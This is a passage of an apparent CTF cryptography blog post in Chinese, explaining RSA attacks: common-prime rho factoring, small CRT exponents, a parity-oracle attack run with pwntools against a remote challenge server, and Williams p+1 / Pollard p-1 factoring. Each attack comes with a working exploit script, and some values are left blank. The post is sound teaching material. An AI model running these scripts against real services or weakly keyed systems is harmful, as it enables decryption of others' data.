href="#exp-9" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line">N = </span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">p, q = N.factor()</span><br><span class="line">p, q = p[<span class="number">0</span>], q[<span class="number">0</span>]</span><br><span class="line">phi = (p**P.degree()<span class="number">-1</span>)*(p**Q.degree()<span class="number">-1</span>)</span><br><span class="line">e = </span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c^d</span><br><span class="line">print(<span class="string">""</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.list()]))</span><br></pre></td></tr></table></figure><h3 id="RSA-Large-Common-Factor-of-p-1-and-q-1"><a href="#RSA-Large-Common-Factor-of-p-1-and-q-1" class="headerlink" title="RSA -  Large Common Factor of  p-1 and q-1"></a>RSA -  Large Common Factor of  p-1 and q-1</h3><h4 id="Theorem-11"><a href="#Theorem-11" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given $N=pq,g|(p-1),g|(q-1)$. (We call it common prime RSA)</p><p>If g is large enough, we have an efficient factoring method for N. (魔改rho)</p><p>[可行分析]</p><p>$p-1=ga,q-1=gb,N-1=gh(h=gab+a+b)$<br>$\therefore x^{N-1}\ (mod\ p)$至多有a个值<br>$\therefore$用$x\rightarrow x^{N-1}+3$代替rho中的迭代函数，能在$O(\sqrt a)=O(N^{1/4-\gamma /2})$下分解N.</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (pow(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(abs(a - b), n)</span><br><span class="line">            print(<span class="string">'&#123;&#125; in &#123;&#125; circle'</span>.format(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">2062899536811871554818178359324161185631864322612928428737135410318396234838612759353304630466467882907238599097155276236974469077407927587176395102072905755064272779705304103155044175760772870357960042973800466612294120431806053764425995115279842108284227580763784948966673592802930476849233889221985236020626654664840038198318033843640935727802767372332931755961464416884826343968074190784107977317020369409515252779597705798495979144688260140280406347997234735504377161004933444363855269475346955181189441066456092467816293921375731674289071178645028262851698651731976240122083422857066357348367076175249101149547</span></span><br><span class="line">    print(rho(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>common prime RSA在g过小时，g也能轻易通过分解N-1来解出（rho等算法分解出的小因子尝试即可）</p><p>关于这类的题型我还没在CTF赛题中见到过，下面给出生成的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    g = <span class="number">2</span> * getPrime(int(nbits * gamma))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">        p = g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">            q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> GCD(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">                q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    lcm = (p * q) // GCD(p, q)</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> GCD(e, lcm) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    d = inverse(e, lcm)</span><br><span class="line">    <span class="keyword">return</span> (n, e), (p, q, d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    (n, e), (p, q, d) = gen_key(<span class="number">2048</span>, <span class="number">0.485</span>)</span><br><span class="line">    print(<span class="string">'n ='</span>, n)</span><br><span class="line">    print(<span class="string">'p ='</span>, p)</span><br><span class="line">    print(<span class="string">'q ='</span>, q)</span><br><span class="line">    print(<span class="string">'e ='</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="RSA-Small-CRT-Private-Exponents"><a href="#RSA-Small-CRT-Private-Exponents" class="headerlink" title="RSA - Small CRT Private Exponents"></a>RSA - Small CRT Private Exponents</h3><h4 id="Theorem-12"><a href="#Theorem-12" class="headerlink" title="Theorem"></a>Theorem</h4><p>平衡的RSA-CRT密码系统下，q&lt;p&lt;2q. 且满足$ed_{p}\equiv 1(mod\ p-1),ed_{q}\equiv 1(mod\ q-1)$</p><p>则$d_{p},d_{q}&lt;min\\{\frac{1}{4}(\frac{N}{e})^{\frac{2}{5}},\frac{1}{3}N^{\frac{1}{4}}\\}$成立时，可有效破解RSA-CRT算法.</p><script type="math/tex; mode=display">\because ed_{p}=1+k(p-1),ed_{q}=1+l(q-1)\\\\\therefore e^{2}d_{p}d_{q}+kl(1-N)+e(d_{p}(l-1)+d_{q}(k-1))=k+l-1.\\\\令x=d_{p}(l-1)+d_{q}(k-1),y=kl,z=k+l-1,\omega =d_{p}d_{q}\\\\有ex+(1-N)y+e^{2}\omega = z,矩阵表示下则为</script><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-34-31.png" alt></p><p>构造一组基如下：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-36-36.png" alt></p><p>我们有如下结论：</p><p>记$v_{0}=(4ex,4N^{\frac{1}{2}}y,e^{\frac{3}{5}}N^{\frac{2}{5}}z)$. 则可以看出$v_{0}$一定是L约化基的三个行向量的线性组合.</p><p>LLL计算后的约化基$\\{b_{1},b_{2},b_{3}\\}$，选取一个适当的上界M，令$|a_{i}|\leq M$, 则验证线性组合$v=a_{1}b_{1}+a_{2}b_{2}+a_{3}b_{3}$对应的$x,y,z,\omega$，看得到的数据能否正确分解N即可.</p><p>M视具体情况而定</p><h4 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h4><p>暂无（因为生成满足要求的$d_{p},d_{q}$以及使对应的$d&gt;N^{0.292}$有点困难）</p><h3 id="RSA-Parity-Oracle"><a href="#RSA-Parity-Oracle" class="headerlink" title="RSA - Parity Oracle"></a>RSA - Parity Oracle</h3><h4 id="Theorem-13"><a href="#Theorem-13" class="headerlink" title="Theorem"></a>Theorem</h4><p>假设存在一个oracle，能对给定密文进行解密并给出对应明文的奇偶信息，则我们只需要log(N)次就能解密任意密文.</p><p>$c\equiv m^{e}(mod\ N)$, 向oracle机发送$2^{e}c\equiv (2m)^{e}(mod\ N)$,则返回奇时，说明$2m&gt;N$，反之$2m&lt;N$</p><p>继续往下分析，此时发送$(2^{2})^{e}c(mod\ N)$, 如果先前返回奇，则此时等同于在校验$2(2m-N)$与N的大小关系，即返回奇说明$m\in (\frac{3N}{4},N)$，反之$m\in (\frac{N}{2},\frac{3N}{4})$，先前返回偶的这一轮次不再分析</p><p>接下来轮次也类似，二分log(N)次即可.</p><h4 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    io = remote(<span class="string">'111.198.29.45'</span>, <span class="string">'42484'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'You can input ciphertext(hexdecimal) now\n'</span>)</span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(c) &amp; <span class="number">1</span>:</span><br><span class="line">        c = <span class="string">'0'</span> + c</span><br><span class="line">    io.sendline(c)</span><br><span class="line">    res = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">assert</span>(res == <span class="string">b'odd'</span> <span class="keyword">or</span> res == <span class="string">b'even'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">b'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    nbits = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = nbits</span><br><span class="line">    low = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    high = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbits):</span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            high = (low + high) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = (low + high) / <span class="number">2</span></span><br><span class="line">        print(i, <span class="string">'/'</span>, nbits)</span><br><span class="line">    <span class="keyword">return</span> int(high)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c = int(input("c = "))</span></span><br><span class="line">    <span class="comment">#e = int(input("e = "))</span></span><br><span class="line">    <span class="comment">#n = int(input("n = "))</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    m = partial(c, e, n)</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="RSA-William’s-p-1-and-Pollard’s-p-1"><a href="#RSA-William’s-p-1-and-Pollard’s-p-1" class="headerlink" title="RSA - William’s p+1 and Pollard’s p-1"></a>RSA - William’s p+1 and Pollard’s p-1</h3><h4 id="Theorem-14"><a href="#Theorem-14" class="headerlink" title="Theorem"></a>Theorem</h4><p>如果要分解的N包含的素数因子p，使得p+1或p-1是平滑的（即只有适当上界的小因子），则William’s p+1和Pollard’s p-1算法能很好实现分解.</p><ul><li><p>William’s p+1 Algorithm</p><p>Step 1：选择整数A(A&gt;2)来表征卢卡斯序列$V_{j}=AV_{j-1}-V_{j-2}$，并初始化$V_{0}=2,V_{1}=A$.</p><p>Step 2：计算序列到$j=m!$.</p><p>​            ps：这步有很大的操作空间（在More里会涉及相关简化计算和证明）</p><p>Step 3：计算$gcd(V_{j}-2,N)$，如果结果等于1或N，则m++并返回Step2，否则进入Step4.</p><p>Step 4：检查p+1是否是m!的因子，如果是，则说明找到的p是p+1平滑的.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-18_20-33-25.png" alt></p><p>因为我们事先不知道p，所以也就无从计算雅各比符号(D/p)，但平方非剩余概率趋于1/2，考虑选取多个A多线程即可（n个A就能使互斥事件的概率降到大约$\frac{1}{2^{n}}$）</p></li><li><p>Pollard’s p-1 Algorithm</p><p>p-1是B-smooth时，很大概率上$(p-1)|B!$（不考虑p-1有很多重复的趋近于B的质因子）</p><p>所以计算$a^{m!}-1$，以及校验gcd即可，$m_{max}$可以是B也可以适当上调.</p></li></ul><h4 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">factor_state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_with_sqrt</span><span class="params">(a, c, b, n, mod)</span>:</span>  <span class="comment"># (a+c*sqrt(b))^n</span></span><br><span class="line">    states = [(a % mod, c % mod)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, mod) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, mod)) %</span><br><span class="line">                     mod, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % mod)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>] *</span><br><span class="line">                            b) % mod, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % mod</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">william_factor</span><span class="params">(n, index)</span>:</span></span><br><span class="line">    start = time.clock()</span><br><span class="line">    <span class="keyword">global</span> factor_state</span><br><span class="line">    A = getRandomRange(<span class="number">3</span>, n)</span><br><span class="line">    <span class="comment">#m = 2</span></span><br><span class="line">    <span class="comment">#next_pos = 1</span></span><br><span class="line">    m = <span class="number">3000</span></span><br><span class="line">    next_pos = reduce(<span class="keyword">lambda</span> x, y : x * y, [i + <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>)])</span><br><span class="line">    B = A**<span class="number">2</span> - <span class="number">4</span></span><br><span class="line">    <span class="comment">#res_x1, res_y1 = A, -1</span></span><br><span class="line">    <span class="comment">#res_x2, res_y2 = A, 1</span></span><br><span class="line">    res_x1, res_y1 = pow_with_sqrt(A, <span class="number">-1</span>, B, next_pos, n)</span><br><span class="line">    res_x2, res_y2 = pow_with_sqrt(A, <span class="number">1</span>, B, next_pos, n)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> factor_state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print((index, m))</span><br><span class="line">        next_pos *= m <span class="comment">#next_pos = m!</span></span><br><span class="line">        C = inverse(pow(<span class="number">2</span>, next_pos, n), n)</span><br><span class="line">        res_x1, res_y1 = pow_with_sqrt(res_x1, res_y1, B, m, n)</span><br><span class="line">        res_x2, res_y2 = pow_with_sqrt(res_x2, res_y2, B, m, n)</span><br><span class="line">        res_x, res_y = (res_x1 + res_x2) % n, (res_y1 + res_y2) % n</span><br><span class="line">        <span class="keyword">assert</span>(iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">False</span> <span class="keyword">and</span> res_y != n)</span><br><span class="line">        <span class="keyword">if</span> iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            res_x = (res_x + res_y * iroot(B, <span class="number">2</span>)[<span class="number">0</span>]) % n</span><br><span class="line">        <span class="comment"># Vi = C((A-sqrt(B))^(m!)+(A+sqrt(B))^(m!))</span></span><br><span class="line">        Vi = (C * res_x) % n</span><br><span class="line">        p = GCD(Vi - <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">assert</span>(p != n) <span class="comment">#p=n说明lucas序列下标过大</span></span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            factor_state = <span class="literal">True</span></span><br><span class="line">            print(<span class="string">'p ='</span>, p)</span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">    <span class="comment">#n = 112729</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=william_factor, args=(n, i))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p>关于William’s p+1 Algorithm的证明：</p><p>Lucas Functions：设$\alpha,\beta$是$x^{2}-Px+Q=0$的根，且有<img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_15-57-19.png" style="zoom:60%;"></p><p>则定义$\Delta=(\alpha-\beta)^{2}=P^{2}-4Q$，知$P=\alpha + \beta,Q=\alpha\beta$.</p><p>有如下定理：</p><p>p为奇素数，且$p\nmid Q$，勒让德符号$(\frac{\Delta}{p})=\epsilon$，则有</p><script type="math/tex; mode=display">U_{(p-\epsilon)m}(P,Q)\equiv 0(mod\ p)\\\\V_{(p-\epsilon)m}(P,Q)\equiv 2Q^{\frac{m(1-\epsilon)}{2}}(mod\ p)</script><p>假设我们有p+1|R，Q=1，$(\frac{\Delta}{p})=\epsilon=-1$，则由上述定理可知：</p><script type="math/tex; mode=display">U_{R}(P,1)\equiv 0(mod\ p)\\\\V_{R}(P,1)-2\equiv 0(mod\ p)</script><p>因为易推出$V_{n+1}=PV_{n}-QV_{n-1}=PV_{n}-V_{n-1}$，则只要在该lucas序列下求出$V_{R}$即可.</p><p>我上面的exp里取的R是$m!(m\in N^{+})$，但m足够大时（如m=1000时，$R≈2^{8000}$），逐项递推变得低效不可解.</p><p>因此简化思想如下：</p><p>上述Lucas序列对应通项为$\frac{(P-\sqrt{P^{2}-4})^{n}+(P+\sqrt{P^{2}-4})^{n}}{2^{n}}$，先fuzz出一个m（m过大时，$gcd(V_R-2,N)=N$），再从$V_{m!}$开始p+1 factor即可，这里还应记住保留前状态$(P-\sqrt{P^{2}-4})^{(m-1)!}$，以便在求解$(P-\sqrt{P^{2}-4})^{m!}$时只要做前状态的m次幂。</p><p>这里也记录一下Coinc1dens师傅的出题笔记：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-56.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-41.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">prime = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span 